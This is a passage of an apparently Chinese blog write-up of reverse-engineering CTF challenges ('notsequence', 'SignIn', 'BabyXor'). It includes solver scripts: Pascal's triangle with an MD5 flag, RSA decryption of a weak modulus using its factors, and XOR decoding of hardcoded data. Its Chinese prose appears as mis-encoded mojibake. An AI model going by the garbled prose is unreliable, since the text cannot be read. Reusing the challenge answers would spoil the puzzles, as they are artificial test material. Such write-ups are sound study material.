class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = <span class="number">0</span>, temp1 = <span class="number">0</span>, q = <span class="number">0</span>, w = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"> temp = (j &gt;&gt; <span class="number">4</span>) % <span class="number">16</span>; </span><br><span class="line"> temp1 = (<span class="number">16</span>*j &gt;&gt; <span class="number">4</span>) % <span class="number">16</span>;</span><br><span class="line"> q = a[<span class="number">2</span>*i];</span><br><span class="line"> <span class="keyword">if</span>(q &lt; <span class="number">48</span> || q &gt; <span class="number">57</span>)</span><br><span class="line"> q = q<span class="number">-87</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">q = q<span class="number">-48</span>;</span><br><span class="line">q = q*<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">w = b[<span class="number">2</span>*i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(w &lt; <span class="number">48</span> || w &gt; <span class="number">57</span>)</span><br><span class="line">w = w<span class="number">-87</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">w = w<span class="number">-48</span>; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span>(c[<span class="number">16</span>*temp + temp1] == ((w+q) ^ <span class="number">0x19</span>))</span><br><span class="line"> &#123;</span><br><span class="line"> flag[i] = j;</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200502083319440-1590490435324-1591162365723.png" alt="image-20200502083319440-1590490435324"></p></li><li><p><strong>æ€»ç»“: &gt;&gt; è¿ç®—ç¬¦ç§»åŠ¨nä½å°±ç›¸å½“äºé™¤ä»¥2^n. ä¸” % çš„ä¼˜å…ˆçº§å¤§äº &gt;&gt;</strong></p></li></ul><hr><h2 id="notsequence"><a href="#notsequence" class="headerlink" title="notsequence"></a>notsequence</h2><ul><li><p>è‡ªå·±ç®—æ³•å¤ªèœäº†, è¿™é“é¢˜çš„2ä¸ªå‡½æ•°å§‹ç»ˆæ²¡çœ‹æ‡‚â€¦ çœ‹äº†writeup, æ¨è¾‰ä¸‰è§’å½¢!</p></li><li><p>çœ‹äº†writeup, è‡ªå·±æ…¢æ…¢çš„åˆ†æäº†ä¸‹. é¦–å…ˆ, check1å‡½æ•°.</p><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200502131757195-1590490442991-1591162417995.png" alt="image-20200502131757195-1590490442991"></p></li><li><p>ç„¶åæ˜¯check2.</p><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200502133008194-1590490446814-1591162443875.png" alt="image-20200502133008194-1590490446814"></p></li><li><p>ç»è¿‡è¿™2ä¸ªå‡½æ•°åˆ¤æ–­, å°±èƒ½çŸ¥é“æ˜¯å¦æ˜¯æ¨è¾‰ä¸‰è§’å½¢äº†. æŠŠå‰20è¡Œçš„æ•°æ®ç»è¿‡md5åŠ å¯†å°±æ˜¯flag.</p></li><li><p>æœ€å, é¢˜è‡ªå·±è™½ç„¶æ¯åšå‡ºæ¥, å€’æ˜¯é€šè¿‡è¿™ä¸ªé¢˜é‡æ–°è®¤è¯†äº†æ¨è¾‰ä¸‰è§’å½¢. å†™äº†Cè¯­è¨€å’Œpythonçš„ç‰ˆæœ¬. ä¹Ÿæ˜¯æƒ³æ‰“å°å‡ºæ¥çœ‹çœ‹, ä¸”è‡ªå·±åˆšæ¥è§¦python, ä»£ç ä¹±è€Œé•¿.</p><p><strong>python3:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createL</span><span class="params">(l)</span>:</span></span><br><span class="line">    L = [<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, len(l)):</span><br><span class="line">        L.append(l[x] + l[x<span class="number">-1</span>])</span><br><span class="line">    L.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printL</span><span class="params">(L, W)</span>:</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> L:</span><br><span class="line">        s += str(x) + <span class="string">" "</span></span><br><span class="line">    print(s.center(W))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_</span><span class="params">(s, L)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> L:</span><br><span class="line">        s += str(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">L = [<span class="number">1</span>]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line">row = int(input(<span class="string">"è¯·è¾“å…¥è¡Œæ•°: "</span>))</span><br><span class="line">width =row* <span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(row):</span><br><span class="line">    printL(L, width)</span><br><span class="line">    s = str_(s, L)</span><br><span class="line">    L = createL(L)</span><br><span class="line">print(s)</span><br><span class="line">m = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">print(<span class="string">"md5åŠ å¯†å:%s"</span> % m)</span><br></pre></td></tr></table></figure><p><strong>C:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">creat</span><span class="params">(<span class="keyword">int</span> *L, <span class="keyword">int</span> lenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(lenth+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; lenth; i++)</span><br><span class="line">p[i] = L[i<span class="number">-1</span>] + L[i];</span><br><span class="line"></span><br><span class="line">p[lenth] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> *L, <span class="keyword">int</span> blank_l, <span class="keyword">int</span> lenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; blank_l; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  "</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%4d"</span>, L[i]); </span><br><span class="line"></span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">translate</span><span class="params">(<span class="keyword">int</span> *L, <span class="keyword">int</span> lenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">100</span>), temp[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">"%d"</span>, L[i]);</span><br><span class="line"><span class="built_in">strcat</span>(p, temp); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>, *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥è¡Œæ•°: "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = creat(p, i);</span><br><span class="line"><span class="built_in">print</span>(p, n-i, i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">strcat</span>(a, (<span class="keyword">char</span> *)translate(p, i+<span class="number">1</span>));</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\næ‰€æœ‰æ•°å€¼ç»„æˆçš„å­—ç¬¦ä¸²ä¸º: %s"</span>, a); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>æ€»ç»“: åœ¨çœ‹ä¸æ‡‚ä»£ç çš„æ—¶å€™, åº”è¯¥æŠŠèƒ½å†™å‡ºæ¥çš„å€¼éƒ½åˆ—ä¸¾å‡ºæ¥, è§‚å¯Ÿä¸€ä¸‹è§„å¾‹.</strong></p></li></ul><hr><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><ul><li><p>è¿™é“é¢˜æ›´åƒæ˜¯æ˜¯cryptoçš„é¢˜, åˆæ¬¡äº†è§£äº†ä¸‹Rsa.</p></li><li><p>ç¨‹åºä¸‹è½½ä¸‹æ¥, æœ‰ä¸€ç³»åˆ—ä¸è®¤è¯†çš„å‡½æ•°, å¤§æ¦‚çŸ¥é“ç”¨æ³•, è¿˜æ˜¯å…ˆå–æŸ¥äº†æŸ¥.<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503094008020-1590490467616-1591162454456.png" alt="image-20200503094008020-1590490467616"></p></li><li><p>GMP(The GNU Multiple Precision Arithmetic Library)åˆå«GNUå¤šç²¾åº¦ç®—æœ¯åº“ï¼Œæ˜¯ä¸€ä¸ªæä¾›äº†å¾ˆå¤šæ“ä½œé«˜ç²¾åº¦çš„å¤§æ•´æ•°ï¼Œæµ®ç‚¹æ•°çš„è¿ç®—çš„ç®—æœ¯åº“ï¼Œå‡ ä¹æ²¡æœ‰ä»€ä¹ˆç²¾åº¦æ–¹é¢çš„é™åˆ¶ï¼ŒåŠŸèƒ½ä¸°å¯Œ. å‡ ä¸ªå¸¸ç”¨çš„:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">æ·»åŠ å¤´æ–‡ä»¶ï¼š<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;gmp.h&gt; </span></span></span><br><span class="line"></span><br><span class="line">ã€€ã€€cmdç¼–è¯‘å‘½ä»¤ï¼šgcc myprogram.c -lgmp -lm -o myprogram</span><br><span class="line"></span><br><span class="line">ã€€ã€€å£°æ˜ä¸€ä¸ªgmpçš„æ•´æ•°rop ï¼š<span class="keyword">mpz_t</span> rop;</span><br><span class="line"></span><br><span class="line">ã€€ã€€æŠŠå­—ç¬¦ä¸²åˆå§‹åŒ–ä¸ºgmpå¤§æ•´æ•°ï¼š<span class="function"><span class="keyword">int</span> <span class="title">mpz_init_set_str</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">char</span>*str, <span class="keyword">int</span> base)</span></span>; </span><br><span class="line"></span><br><span class="line">ã€€ã€€é‡Šæ”¾ç©ºé—´ï¼š<span class="function"><span class="keyword">void</span>  <span class="title">mpz_clear</span><span class="params">(<span class="keyword">mpz_t</span> rop)</span></span>;<span class="comment">//å£°æ˜äº†ä¸€ä¸ªå˜é‡ï¼Œåœ¨ç¨‹åºçš„æœ€åä¸€å®šè¦é‡Šæ”¾ï¼Œä¸ç„¶ä¼šæŠ¥é”™</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€åŠ æ³•ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_add</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op1, <span class="keyword">mpz_t</span> op2)</span></span>;  <span class="comment">//rop = op1 + op2</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€å‡æ³•ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_sub</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op1, <span class="keyword">mpz_t</span> op2)</span></span>;  <span class="comment">//rop = op1 - op2</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€ä¹˜æ³•ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_mul</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op1, <span class="keyword">mpz_t</span> op2)</span></span>; <span class="comment">//rop = op1 * op2</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€é™¤æ³•ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_cdiv_q</span> <span class="params">(<span class="keyword">mpz_t</span> q, <span class="keyword">mpz_t</span> n, <span class="keyword">mpz_t</span> d)</span></span>;  <span class="comment">//q = n/d,è¿™ä¸ªæœ‰å¾ˆå¤šç§ç±»å‹ï¼Œå…·ä½“çš„çœ‹ä½¿ç”¨æ‰‹å†Œ</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€å¹‚è¿ç®—ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_pow_ui</span> <span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> base, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">exp</span>)</span></span>;  <span class="comment">//rop = base^exp</span></span><br><span class="line">  void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod)  ä½œç”¨: Set rop to base^exp mod mod. è¿™æ˜¯è¿™é“é¢˜ä¸­ç”¨åˆ°çš„. ä¹Ÿæ˜¯rsaåŠ å¯†è§£å¯†å¸¸ç”¨çš„.</span><br><span class="line">          </span><br><span class="line"></span><br><span class="line">ã€€ã€€å¼€æ–¹ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_sqrt</span> <span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op)</span></span>; <span class="comment">//rop = opå¼€æ–¹çš„å‘ä¸‹å–æ•´</span></span><br></pre></td></tr></table></figure></li><li><p>æ•´ä¸ªæµç¨‹, æ˜¾ç„¶æ˜¯rsaåŠ å¯†.  </p><table><thead><tr><th align="center">æ­¥éª¤</th><th>è¯´æ˜</th><th>æè¿°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">1</td><td>æ‰¾å‡ºè´¨æ•°</td><td>P ã€Q</td><td>-</td></tr><tr><td align="center">2</td><td>è®¡ç®—å…¬å…±æ¨¡æ•°</td><td>N = P * Q</td><td>-</td></tr><tr><td align="center">3</td><td>æ¬§æ‹‰å‡½æ•°</td><td>Ï†(N) = (P-1)(Q-1)</td><td>-</td></tr><tr><td align="center">4</td><td>è®¡ç®—å…¬é’¥E</td><td>1 &lt; E &lt; Ï†(N)</td><td>Eçš„å–å€¼å¿…é¡»æ˜¯æ•´æ•°  E å’Œ Ï†(N) å¿…é¡»æ˜¯äº’è´¨æ•°</td></tr><tr><td align="center">5</td><td>è®¡ç®—ç§é’¥D</td><td>E * D % Ï†(N) = 1</td><td>-</td></tr><tr><td align="center">6</td><td>åŠ å¯†</td><td>C ï¼ M ^E mod N</td><td>Cï¼šå¯†æ–‡  Mï¼šæ˜æ–‡</td></tr><tr><td align="center">7</td><td>è§£å¯†</td><td>M ï¼C ^D mod N</td><td>Cï¼šå¯†æ–‡  Mï¼šæ˜æ–‡</td></tr></tbody></table></li><li><p>ä½†æ˜¯ä¹‹å‰æœ‰ä¸€ä¸ªsub_96Aå‡½æ•°.(æœ€ä¸Šé¢çš„ç®­å¤´æ‰€ç¤º), ç°åœ¨è¿›å…¥è¿™ä¸ªå‡½æ•°çœ‹çœ‹. è¿™é‡Œæ˜¯ä»å­—ç¬¦çš„ASCIIè½¬åŒ–ä¸º16è¿›åˆ¶, <strong>(æœ€ä¸Šé¢çš„ Windows_Reverse2æœ‰ä» 16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦çš„ç®—æ³•, éƒ½æŒºç®€æ´çš„)</strong><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503094306385-1590490481485-1591162474450.png" alt="image-20200503094306385-1590490481485"></p></li><li><p>æ•´ä¸ªç¨‹åºå°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦, å…ˆè½¬åŒ–ä¸º16è¿›åˆ¶æ•°å€¼å­—ç¬¦, å†å˜æˆä¸€ä¸ªå¤§æ•°ä½œä¸ºæ˜æ–‡. ç»è¿‡  <strong>C ï¼ M ^E mod N</strong>, åŠ å¯†åå’Œç¼–ç çš„å¯†æ–‡è¿›è¡Œå¯¹æ¯”. é¦–å…ˆè¿™é‡Œçš„ E = v5 = 65537. Mæ˜¯æ˜æ–‡. N = v4 = 103461035900816914121390101299049044413950405173712170434161686539878160984549. æ ¹æ®è§£å¯†è¿‡ç¨‹, æˆ‘ä»¬å…ˆæŠŠ N åˆ†è§£æˆ p q , å¯ä»¥å»åœ¨çº¿åˆ†è§£.<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503095605681-1590490490248-1591162483535.png" alt="image-20200503095605681-1590490490248"></p></li><li><p>ç„¶åä½¿ç”¨ pythonçš„gmpy2åº“å…ˆæ±‚é€†å…ƒå¾—åˆ°<strong>D</strong>. æœ€åç”¨  <strong>M ï¼C ^D mod N</strong>  è§£å¯†å¹¶ä»16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦. è¿™ä¸ªgmpy2çš„åº“çš„å®‰è£…è¿˜è´¹äº†äº›æ—¶é—´..ğŸ¤£ <strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">N = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = gmpy2.powmod(c, d, p*q)</span><br><span class="line"></span><br><span class="line">print(bytes.fromhex(hex(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503101307822-1590490496701-1591162599070.png" alt="image-20200503101307822-1590490496701"></p><ul><li><strong>æ€»ç»“: (1)å¯¹rsaæœ‰äº†åˆæ­¥çš„äº†è§£, å­¦ä¼šäº†ç®€å•çš„åŠ å¯†è§£å¯†æ–¹æ³•. (2)GMPç®—æ•°åº“çš„è®¤è¯†. (3)å­—ç¬¦çš„ASCIIè½¬16è¿›åˆ¶çš„ç®€æ´ç®—æ³•.</strong></li></ul><hr><h2 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h2><ul><li><p>é¦–å…ˆ, æ˜æ˜å¯ä»¥ç›´æ¥ODåŠ¨æ€è°ƒè¯•, å¾ˆå¿«å¾—åˆ°flag.  ä½†æ˜¯æˆ‘ç”¨idaæŠŠé¢˜åšå®Œ, æ‰ä¸€ä¸‹å­æƒ³èµ·.ğŸ¤£</p></li><li><p>å‘ç°æœ‰å£³, è½½å…¥ODä½¿ç”¨å †æ ˆå¹³è¡¡è„±å£³. è½½å…¥ida, å‘ç°mainå‡½æ•°é‡Œæœ‰å¾ˆå¤šå‡½æ•°, ä¸Šä¸‹åˆ†æäº†ä¸‹, å‘ç°éƒ½æ˜¯å¹²æ‰°çš„å‡½æ•°. <img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503173759296-1590490519677-1591162520630.png" alt="image-20200503173759296-1590490519677"></p><p>ç¡®å®šç›®æ ‡, å°±æ˜¯é€šè¿‡è¿™å‡ ä¸ªå‡½æ•°ä»ç¼–ç çš„æ•°æ®ä¸­å–å‡ºå­—ç¬¦ç»è¿‡ä¸€äº›ç®€å•çš„å¼‚æˆ–è¿ç®—, å­˜æ”¾å†ä¸€ä¸ªå†…å­˜ç©ºé—´. ä½†æ˜¯ä¸æˆ‘ä»¬è¾“å…¥æ•°æ®æ²¡æœ‰å…³ç³». (è¿™æ—¶å€™, å°±å¯ä»¥ç›´æ¥å–ODåŠ¨æ€è°ƒè¯•ç›´æ¥å¾—åˆ°flagçš„, å”‰, æˆ‘ç®—å‡ºæ¥æ‰æƒ³èµ·)</p></li><li><p>ä¸€ä¸ªç–‘é—®çš„åœ°æ–¹<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503174247305-1590490527077-1591162527371.png" alt="image-20200503174247305-1590490527077"></p></li><li><p>ç„¶åçœ‹äº†çœ‹æ±‡ç¼–ä»£ç . è¿˜æ˜¯ä¸æ¸…æ¥š.  <img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503174332262-1590490532558-1591162533239.png" alt="image-20200503174332262-1590490532558"></p></li><li><p>è¿›å»ODè°ƒè¯•çœ‹çœ‹.å‘ç°ä»£ç åˆæ˜¯ä¸€ä¸ªæ ·. ä¸è¿‡è¿™ä¸‹å°±æ¸…æ¥šäº†. å…ˆå–åœ°å€çš„å€¼. <strong>è®°ä½è¿™ç‚¹</strong><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503174534451-1590490539636-1591162540789.png" alt="image-20200503174534451-1590490539636"></p></li><li><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">56</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">14</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">  